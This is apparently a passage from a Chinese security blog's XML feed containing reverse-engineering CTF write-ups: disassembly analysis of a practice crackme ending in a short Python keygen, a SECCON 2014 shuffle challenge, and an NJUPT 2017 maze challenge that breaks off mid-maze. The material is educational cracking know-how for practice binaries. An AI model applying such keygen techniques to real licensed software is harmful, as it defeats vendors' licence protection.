class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">18</span>]                  | [<span class="built_in">ebp</span>-<span class="number">18</span>]:L<span class="string">"123"</span></span><br><span class="line">0040247E | <span class="number">51</span>                       | <span class="keyword">push</span> <span class="built_in">ecx</span>                                       |</span><br><span class="line">0040247F | <span class="number">52</span>                       | <span class="keyword">push</span> <span class="built_in">edx</span>                                       |</span><br><span class="line"><span class="number">00402480</span> | 6A <span class="number">03</span>                    | <span class="keyword">push</span> <span class="number">3</span>                                         |</span><br><span class="line"><span class="number">00402482</span> | FF <span class="number">15</span> 5C <span class="number">41</span> <span class="number">40</span> <span class="number">00</span>        | <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;_vbaFreeStrList&gt;]         |</span><br><span class="line"><span class="number">00402488</span> | <span class="number">83</span> C4 <span class="number">10</span>                 | <span class="keyword">add</span> <span class="built_in">esp</span>,<span class="number">10</span>                                     |</span><br><span class="line">0040248B | <span class="number">8D</span> <span class="number">45</span> D4                 | <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-2C]                  |</span><br><span class="line">0040248E | <span class="number">8D</span> <span class="number">4D</span> D8                 | <span class="keyword">lea</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">28</span>]                  |</span><br><span class="line"><span class="number">00402491</span> | <span class="number">8D</span> <span class="number">55</span> DC                 | <span class="keyword">lea</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">24</span>]                  |</span><br><span class="line"><span class="number">00402494</span> | <span class="number">50</span>                       | <span class="keyword">push</span> <span class="built_in">eax</span>                                       | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line"><span class="number">00402495</span> | <span class="number">51</span>                       | <span class="keyword">push</span> <span class="built_in">ecx</span>                                       |</span><br><span class="line"><span class="number">00402496</span> | <span class="number">52</span>                       | <span class="keyword">push</span> <span class="built_in">edx</span>                                       |</span><br><span class="line"><span class="number">00402497</span> | 6A <span class="number">03</span>                    | <span class="keyword">push</span> <span class="number">3</span>                                         |</span><br><span class="line"><span class="number">00402499</span> | FF <span class="number">15</span> F4 <span class="number">40</span> <span class="number">40</span> <span class="number">00</span>        | <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;_vbaFreeObjList&gt;]         |</span><br><span class="line">0040249F | 8B <span class="number">06</span>                    | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>]                     | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line">004024A1 | <span class="number">83</span> C4 <span class="number">10</span>                 | <span class="keyword">add</span> <span class="built_in">esp</span>,<span class="number">10</span>                                     |</span><br><span class="line">004024A4 | <span class="number">56</span>                       | <span class="keyword">push</span> <span class="built_in">esi</span>                                       |</span><br><span class="line">004024A5 | FF <span class="number">90</span> <span class="number">04</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>        | <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="number">304</span>]                    |</span><br><span class="line">004024AB | 8B <span class="number">1D</span> 0C <span class="number">41</span> <span class="number">40</span> <span class="number">00</span>        | <span class="keyword">mov</span> <span class="built_in">ebx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;_vbaObjSet&gt;]           |</span><br><span class="line">004024B1 | <span class="number">50</span>                       | <span class="keyword">push</span> <span class="built_in">eax</span>                                       | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line">004024B2 | <span class="number">8D</span> <span class="number">45</span> DC                 | <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">24</span>]                  |</span><br><span class="line">004024B5 | <span class="number">50</span>                       | <span class="keyword">push</span> <span class="built_in">eax</span>                                       | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line">004024B6 | FF D3                    | <span class="keyword">call</span> <span class="built_in">ebx</span>                                       |</span><br><span class="line">004024B8 | 8B F8                    | <span class="keyword">mov</span> <span class="built_in">edi</span>,<span class="built_in">eax</span>                                    | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line">004024BA | <span class="number">8D</span> <span class="number">55</span> E8                 | <span class="keyword">lea</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">18</span>]                  | [<span class="built_in">ebp</span>-<span class="number">18</span>]:L<span class="string">"123"</span></span><br><span class="line">004024BD | <span class="number">52</span>                       | <span class="keyword">push</span> <span class="built_in">edx</span>                                       |</span><br><span class="line">004024BE | <span class="number">57</span>                       | <span class="keyword">push</span> <span class="built_in">edi</span>                                       |</span><br><span class="line">004024BF | 8B 0F                    | <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edi</span>]                     |</span><br><span class="line">004024C1 | FF <span class="number">91</span> A0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>        | <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>+A0]                     |</span><br><span class="line">004024C7 | <span class="number">85</span> C0                    | <span class="keyword">test</span> <span class="built_in">eax</span>,<span class="built_in">eax</span>                                   | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line">004024C9 | <span class="number">7D</span> <span class="number">12</span>                    | <span class="keyword">jge</span> afkayas<span class="meta">.1</span>.4024<span class="built_in">DD</span>                           |</span><br><span class="line">004024CB | <span class="number">68</span> A0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           | <span class="keyword">push</span> A0                                        |</span><br><span class="line">004024D0 | <span class="number">68</span> 5C <span class="number">1B</span> <span class="number">40</span> <span class="number">00</span>           | <span class="keyword">push</span> afkayas<span class="meta">.1</span>.401B5C                          |</span><br><span class="line">004024D5 | <span class="number">57</span>                       | <span class="keyword">push</span> <span class="built_in">edi</span>                                       |</span><br><span class="line">004024D6 | <span class="number">50</span>                       | <span class="keyword">push</span> <span class="built_in">eax</span>                                       | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line">004024D7 | FF <span class="number">15</span> <span class="number">04</span> <span class="number">41</span> <span class="number">40</span> <span class="number">00</span>        | <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;_vbaHresultCheckObj&gt;]     |</span><br><span class="line">004024<span class="built_in">DD</span> | <span class="number">56</span>                       | <span class="keyword">push</span> <span class="built_in">esi</span>                                       |</span><br><span class="line">004024DE | FF <span class="number">95</span> <span class="number">40</span> FF FF FF        | <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-C0]                     | [<span class="built_in">ebp</span>-C0]:&amp;<span class="string">"牪l"</span></span><br><span class="line">004024E4 | <span class="number">50</span>                       | <span class="keyword">push</span> <span class="built_in">eax</span>                                       | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line">004024E5 | <span class="number">8D</span> <span class="number">45</span> D8                 | <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">28</span>]                  |</span><br><span class="line">004024E8 | <span class="number">50</span>                       | <span class="keyword">push</span> <span class="built_in">eax</span>                                       | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line">004024E9 | FF D3                    | <span class="keyword">call</span> <span class="built_in">ebx</span>                                       |</span><br><span class="line">004024EB | 8B F0                    | <span class="keyword">mov</span> <span class="built_in">esi</span>,<span class="built_in">eax</span>                                    | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line">004024ED | <span class="number">8D</span> <span class="number">55</span> E4                 | <span class="keyword">lea</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-1C]                  | [<span class="built_in">ebp</span>-1C]:L<span class="string">"123"</span></span><br><span class="line">004024F0 | <span class="number">52</span>                       | <span class="keyword">push</span> <span class="built_in">edx</span>                                       |</span><br><span class="line">004024F1 | <span class="number">56</span>                       | <span class="keyword">push</span> <span class="built_in">esi</span>                                       |</span><br><span class="line">004024F2 | 8B 0E                    | <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>]                     |</span><br><span class="line">004024F4 | FF <span class="number">91</span> A0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>        | <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>+A0]                     |</span><br><span class="line">004024FA | <span class="number">85</span> C0                    | <span class="keyword">test</span> <span class="built_in">eax</span>,<span class="built_in">eax</span>                                   | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line">004024FC | <span class="number">7D</span> <span class="number">12</span>                    | <span class="keyword">jge</span> afkayas<span class="meta">.1</span><span class="meta">.402510</span>                           |</span><br><span class="line">004024FE | <span class="number">68</span> A0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           | <span class="keyword">push</span> A0                                        |</span><br><span class="line"><span class="number">00402503</span> | <span class="number">68</span> 5C <span class="number">1B</span> <span class="number">40</span> <span class="number">00</span>           | <span class="keyword">push</span> afkayas<span class="meta">.1</span>.401B5C                          |</span><br><span class="line"><span class="number">00402508</span> | <span class="number">56</span>                       | <span class="keyword">push</span> <span class="built_in">esi</span>                                       |</span><br><span class="line"><span class="number">00402509</span> | <span class="number">50</span>                       | <span class="keyword">push</span> <span class="built_in">eax</span>                                       | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line">0040250A | FF <span class="number">15</span> <span class="number">04</span> <span class="number">41</span> <span class="number">40</span> <span class="number">00</span>        | <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;_vbaHresultCheckObj&gt;]     |</span><br><span class="line"><span class="number">00402510</span> | 8B <span class="number">45</span> E8                 | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">18</span>]                  | [<span class="built_in">ebp</span>-<span class="number">18</span>]:L<span class="string">"123"</span></span><br><span class="line"><span class="number">00402513</span> | 8B <span class="number">4D</span> E4                 | <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-1C]                  | [<span class="built_in">ebp</span>-1C]:L<span class="string">"123"</span></span><br><span class="line"><span class="number">00402516</span> | 8B <span class="number">3D</span> <span class="number">00</span> <span class="number">41</span> <span class="number">40</span> <span class="number">00</span>        | <span class="keyword">mov</span> <span class="built_in">edi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;_vbaStrCat&gt;]           |</span><br><span class="line">0040251C | <span class="number">50</span>                       | <span class="keyword">push</span> <span class="built_in">eax</span>                                       | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line"><span class="number">0040251D</span> | <span class="number">68</span> <span class="number">70</span> <span class="number">1B</span> <span class="number">40</span> <span class="number">00</span>           | <span class="keyword">push</span> afkayas<span class="meta">.1</span>.401B70                          | 401B70:L<span class="string">"AKA-"</span></span><br><span class="line"><span class="number">00402522</span> | <span class="number">51</span>                       | <span class="keyword">push</span> <span class="built_in">ecx</span>                                       |</span><br><span class="line"><span class="number">00402523</span> | FF D7                    | <span class="keyword">call</span> <span class="built_in">edi</span>                                       |</span><br><span class="line"><span class="number">00402525</span> | 8B <span class="number">1D</span> <span class="number">70</span> <span class="number">41</span> <span class="number">40</span> <span class="number">00</span>        | <span class="keyword">mov</span> <span class="built_in">ebx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;_vbaStrMove&gt;]          | 拼接</span><br><span class="line">0040252B | 8B D0                    | <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">eax</span>                                    | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line"><span class="number">0040252D</span> | <span class="number">8D</span> <span class="number">4D</span> E0                 | <span class="keyword">lea</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">20</span>]                  |</span><br><span class="line"><span class="number">00402530</span> | FF D3                    | <span class="keyword">call</span> <span class="built_in">ebx</span>                                       |</span><br><span class="line"><span class="number">00402532</span> | <span class="number">50</span>                       | <span class="keyword">push</span> <span class="built_in">eax</span>                                       | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line"><span class="number">00402533</span> | FF <span class="number">15</span> <span class="number">28</span> <span class="number">41</span> <span class="number">40</span> <span class="number">00</span>        | <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;_vbaStrCmp&gt;]              |</span><br></pre></td></tr></table></figure><p>上面我已经对关键的函数和操作进行了注释，得出注释中这些结论的方法主要是看函数栈和返回值。最后那里的拼接，是在计算得到的字符串前加上“AKA-”这一前缀。</p><p>则整个注册算法的思路是：</p><ol><li>取得name的长度。</li><li>将长度乘以一个常数0x17cfb。</li><li>再取得name的首字母。</li><li>将首字母的ascii值加上步骤2得到的结果。</li><li>最终得到字符串型的结果。</li><li>将结果拼接得到key。</li><li>将key与输入的key比较，最终联系到前面说过的关键跳转。</li></ol><p>根据注册算法写出注册机：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name = input(<span class="string">'name: '</span>)</span><br><span class="line">num = len(name) * <span class="number">0x17cfb</span> + ord(name[<span class="number">0</span>])</span><br><span class="line">print(<span class="string">'key is: AKA-'</span>+str(num))</span><br></pre></td></tr></table></figure></p><p>最终验证结果：</p><p><img src="/2019/05/08/AfKayAs-CrackMe-1/2.png" alt="final"></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SECCON-CTF-2014 Shuffle</title>
      <link href="/2019/04/30/SECCON-CTF-2014-Shuffle/"/>
      <url>/2019/04/30/SECCON-CTF-2014-Shuffle/</url>
      
        <content type="html"><![CDATA[<p><a href="shuffle">题目下载</a></p><p>hint（机翻？）：找到字符串在随机化之前</p><p>部分代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//......</span></span><br><span class="line">v49 = <span class="string">'\0'</span>;</span><br><span class="line">v3 = time(<span class="number">0</span>);</span><br><span class="line">v4 = getpid();</span><br><span class="line">srand(v3 + v4);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  v5 = rand() % <span class="number">0x28</span>u;</span><br><span class="line">  v6 = rand() % <span class="number">0x28</span>u;</span><br><span class="line">  v7 = *(&amp;s + v5);</span><br><span class="line">  *(&amp;s + v5) = *(&amp;s + v6);</span><br><span class="line">  *(&amp;s + v6) = v7;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(&amp;s);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>省略部分为数组初始化内容，根据题意…根据个屁的题意啊，flag在上面写着呢。像我这种比较懒的，用gdb跑到随机化函数前，从内存里读出来的，因为不会用IDA把这种运行时赋值的数组批量导出，懒得一个个字符敲了……这题为啥要给放到进阶场？</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NJUPT CTF 2017 maze</title>
      <link href="/2019/04/29/NJUPT-CTF-2017-maze/"/>
      <url>/2019/04/29/NJUPT-CTF-2017-maze/</url>
      
        <content type="html"><![CDATA[<p><a href="maze">题目下载</a></p><p>hint：菜鸡想要走出菜狗设计的迷宫。</p><p>代码比较长：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v3; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// bp</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v8; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+0h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  v10 = <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input flag:"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;s1, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;s1) != <span class="number">24</span> || (v3 = <span class="string">"nctf&#123;"</span>, <span class="built_in">strncmp</span>(&amp;s1, <span class="string">"nctf&#123;"</span>, <span class="number">5u</span>LL)) || *(&amp;byte_6010BF + <span class="number">24</span>) != <span class="string">'&#125;'</span> )</span><br><span class="line">  &#123;</span><br><span class="line">WRONG:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Wrong flag!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = <span class="number">5L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;s1) - <span class="number">1</span> &gt; <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = *(&amp;s1 + v4);</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v5 &gt; <span class="string">'N'</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = (<span class="keyword">unsigned</span> __int8)v5;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)v5 == <span class="string">'O'</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v7 = sub_400650((_DWORD *)&amp;v10 + <span class="number">1</span>);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v5 == <span class="string">'o'</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v7 = sub_400660((<span class="keyword">char</span> *)&amp;v10 + <span class="number">4</span>, v3);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v5 = (<span class="keyword">unsigned</span> __int8)v5;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)v5 == <span class="string">'.'</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v7 = sub_400670(&amp;v10);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v5 == <span class="string">'0'</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v7 = sub_400680(&amp;v10, v3);</span><br><span class="line">LABEL_14:</span><br><span class="line">          v6 = v7;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_15:</span><br><span class="line">      v3 = (<span class="keyword">const</span> <span class="keyword">char</span> *)HIDWORD(v10);</span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> __int8)sub_400690((__int64)asc_601060, SHIDWORD(v10), v10) )</span><br><span class="line">        <span class="keyword">goto</span> WRONG;</span><br><span class="line">      <span class="keyword">if</span> ( ++v4 &gt;= <span class="built_in">strlen</span>(&amp;s1) - <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v6 )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">LABEL_20:</span><br><span class="line">        v8 = <span class="string">"Wrong flag!"</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( asc_601060[<span class="number">8</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)v10 + SHIDWORD(v10)] != <span class="string">'#'</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">  v8 = <span class="string">"Congratulations!"</span>;</span><br><span class="line">LABEL_21:</span><br><span class="line">  <span class="built_in">puts</span>(v8);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据第一个if，可以判断出：</p><ul><li>flag的长度为24</li><li>以nctf{开头</li><li>以}结尾</li></ul><p>根据打印正确提示句上方if，查看400690：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">sub_400690</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = *(<span class="keyword">unsigned</span> __int8 *)(a1 + a2 + <span class="number">8L</span>L * a3);</span><br><span class="line">  LOBYTE(result) = (_DWORD)result == <span class="string">' '</span> || (_DWORD)result == <span class="string">'#'</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查了一下<code>SHIDWORD</code>这个宏，发现IDA对其定义为<code>(*((int32*)&amp;(x)+1))</code>。</p><p>这里把a3乘以了8，加上a2，这里比较关键的是联系hint，把a2、a3当成二维数组，由此推出迷宫宽是8。迷宫字符串asc_601060长度正好是72，进一步印证了假设。并且根据最后一个if，可以知道迷宫的终点应该是’#’。</p><p>再看程序中段的四种输入情况（’O’、’.’、’0’、’o’），四种情况分别对应了四个函数，联系上面的v10，推测出v10表示行，v10+1表示列（开始没想到，还在思考v10+1是个什么鬼……看了夜影师傅博客才知道的）</p><p>‘O’的情况：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> __<span class="function">fastcall <span class="title">sub_400650</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v1 = (*a1)--;</span><br><span class="line">  <span class="keyword">return</span> v1 &gt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传入的参数是<code>(_DWORD *)&amp;v10 + 1</code>，也即列号，猜测此函数是向左走。其余三个函数同理。这部分我还用ghidra看了一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">int</span>)uVar4 &lt; <span class="number">0x4f</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> ((uVar4 &amp; <span class="number">0xff</span>) == <span class="number">0x2e</span>) &#123;</span><br><span class="line">    cVar1 = FUN_00400670(&amp;local_28);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((uVar4 &amp; <span class="number">0xff</span>) == <span class="number">0x30</span>) &#123;</span><br><span class="line">      cVar1 = FUN_00400680(&amp;local_28);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> ((uVar4 &amp; <span class="number">0xff</span>) == <span class="number">0x4f</span>) &#123;</span><br><span class="line">    cVar1 = FUN_00400650((<span class="keyword">long</span>)&amp;local_28 + <span class="number">4</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((uVar4 &amp; <span class="number">0xff</span>) == <span class="number">0x6f</span>) &#123;</span><br><span class="line">      cVar1 = FUN_00400660((<span class="keyword">long</span>)&amp;local_28 + <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>感觉改成<code>(long)&amp;local_28 + 4</code>这种格式更方便阅读，不过ghidra还是用不惯。</p><p>把迷宫打印了一下，图中为了方便阅读，我把空格替换成了’$’，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$$******</span><br><span class="line">*$$$*$$*</span><br><span class="line">***$*$**</span><br><span class="line">**$$*$**</span><br><span class="line">*$$*#$$*</span><br><span class="line">**$***$*</span><br><span 